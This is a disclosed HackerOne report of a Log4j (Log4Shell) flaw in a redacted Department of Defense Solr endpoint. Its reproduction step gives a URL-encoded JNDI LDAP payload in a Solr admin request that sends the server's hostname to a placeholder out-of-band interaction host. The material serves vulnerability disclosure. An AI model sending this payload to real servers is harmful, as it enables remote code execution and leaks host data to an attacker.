---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1631370'
original_report_id: '1631370'
title: solr_log4j - http://██████████
weakness: Code Injection
team_handle: deptofdefense
created_at: '2022-07-08T14:08:07.836Z'
disclosed_at: '2022-09-06T19:10:39.069Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- code-injection
---

# solr_log4j - http://██████████

## Metadata

- HackerOne Report ID: 1631370
- Weakness: Code Injection
- Program: deptofdefense
- Disclosed At: 2022-09-06T19:10:39.069Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi security team, i found a solr log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Just send get request to this path and change your interact server

PATH ----> http://████████/solr/admin/collections?action=$%7Bjndi:ldap://$%7BhostName%7D.YOURINTERACTSERVER/a%7D

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
